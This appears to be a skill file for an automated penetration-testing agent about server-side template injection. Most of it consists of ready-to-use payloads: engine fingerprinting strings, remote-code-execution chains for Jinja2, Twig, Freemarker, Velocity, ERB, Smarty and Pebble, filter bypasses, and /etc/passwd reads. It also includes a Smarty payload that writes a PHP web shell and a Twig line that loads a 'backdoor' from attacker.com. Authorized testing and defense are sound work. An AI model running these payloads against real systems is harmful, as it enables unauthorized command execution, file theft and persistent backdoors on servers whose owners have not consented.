---
name: ssti
description: Server-side template injection testing - engine detection, RCE payload chains for Jinja2/Twig/ERB/Freemarker/Velocity/Pebble/Smarty
---

# Server-Side Template Injection (SSTI)

SSTI occurs when user input is embedded into a template string before rendering, allowing template syntax execution. Even "safe-looking" template escaping can be bypassed via sandbox escapes. Target: any user-controlled value that ends up inside a server-rendered template.

## Attack Surface

**Template Engines**
- Python: Jinja2 (Flask/Django), Mako, Tornado, Chameleon
- Java: Freemarker, Velocity, Thymeleaf, Pebble, Groovy
- Ruby: ERB, Slim, Haml
- PHP: Smarty, Twig, Blade (Laravel), Latte
- Node.js: Pug/Jade, EJS, Nunjucks, Handlebars, Mustache
- .NET: Razor, DotLiquid

**Typical Entry Points**
- User-supplied email subject/body templates
- "Personalization" fields rendered into marketing emails
- Error page messages, welcome messages with user name
- Report/PDF generators that accept user format strings
- Search/filter expressions evaluated server-side
- CMS page content with template rendering enabled

## Engine Detection

### Universal Fuzzing String

```
${{<%[%'"}}%\
{{7*7}}
${7*7}
<%= 7*7 %>
${{"a".toUpperCase()}}
#{7*7}
*{7*7}
```

Check if output is `49`, `7777777`, or triggers an error — all confirm template execution.

### Detection Matrix

| Payload | Jinja2 | Twig | Freemarker | ERB | Velocity |
|---------|--------|------|------------|-----|----------|
| `{{7*7}}` | 49 | 49 | literal | literal | literal |
| `{{7*'7'}}` | 7777777 | Error | — | — | — |
| `${7*7}` | literal | literal | 49 | literal | literal |
| `<%= 7*7 %>` | literal | literal | literal | 49 | literal |
| `#set($x=7*7)$x` | literal | literal | literal | literal | 49 |

### Differential Fingerprinting

```
{{7*7}}          → 49 (Jinja2/Twig, Python/PHP)
{{7*'7'}}        → 7777777 (Jinja2) vs 49 (Twig)
${7*7}           → 49 (Freemarker/Velocity)
<%= 7*7 %>       → 49 (ERB/EJS)
#{7*7}           → 49 (Ruby string interpolation)
```

## Exploitation by Engine

### Jinja2 (Python / Flask)

```python
# RCE via __class__ chain
{{''.__class__.__mro__[1].__subclasses__()}}

# List subclasses, find Popen index (typically ~375+)
{{''.__class__.__mro__[1].__subclasses__()[408]('id', shell=True, stdout=-1).communicate()}}

# Alternative — config object (Flask)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Shorter via request (Flask)
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}

# File read
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}

# Bypass filters (no dots)
{{request|attr('__class__')|attr('__mro__')|last|attr('__subclasses__')()|list|last|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}
```

### Twig (PHP)

```php
# Version disclosure
{{_self.env.getExtension('Symfony\Bridge\Twig\Extension\TranslationExtension')}}

# RCE via registerUndefinedFilterCallback (single-quote bypass for htmlspecialchars)
{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}

# Alternative
{{['id']|map('system')|join}}

# PHP source read
{{_self.env.setCache('ftp://attacker.com/')}}{{_self.env.loadTemplate('backdoor')}}
```

### Freemarker (Java)

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${product.getClass().getProtectionDomain().getCodeSource()}
${"freemarker.template.utility.Execute"?new()("id")}

# File read
${.data_model}
<#assign r=.jvm_uptime/>
```

### Velocity (Java)

```velocity
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getMethod("exec","".class).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")

#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
```

### ERB (Ruby)

```erb
<%= system("id") %>
<%= `id` %>
<%= IO.popen("id").read %>
<%= File.read('/etc/passwd') %>
<%= Dir.entries('/') %>
```

### Smarty (PHP)

```php
{php}phpinfo();{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('id')}
```

### Pebble (Java)

```java
{% set cmd = 'id' %}
{% set bytes = {'bytes': cmd.getBytes()} %}
{% for i in 0..1 %}
  {% set rt = "".class.forName("java.lang.Runtime") %}
  {% set proc = rt.getMethod("exec","".class).invoke(rt.getMethod("getRuntime").invoke(null), cmd) %}
  {{ proc.getInputStream().text }}
{% endfor %}
```

## Context-Breaking (HTML-encoded Input)

When input is HTML-encoded before template rendering, use single quotes to survive `htmlspecialchars`:

```
# Double-quote (breaks in HTML-encoded context):
{{_self.env.registerUndefinedFilterCallback("system")}}

# Single-quote (survives htmlspecialchars default ENT_COMPAT):
{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}

# Break out of existing expression first:
}}{{7*7}}{{
"}}'}}{{7*7}}
```

## Validation Approach

1. Inject `{{7*7}}` / `${7*7}` / `<%= 7*7 %>` and check for `49` in response
2. Fingerprint engine with differential payloads
3. Escalate to RCE proof: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` (Jinja2)
4. Confirm via proxy: send_request with payload → view_request response shows `uid=...`
5. Evidence: proxy request ID + response showing command output

## Tools

- `tplmap` — automated SSTI detection and exploitation
- `SSTImap` — updated multi-engine SSTI tool
- Manual engine-specific payloads above verified via `send_request`
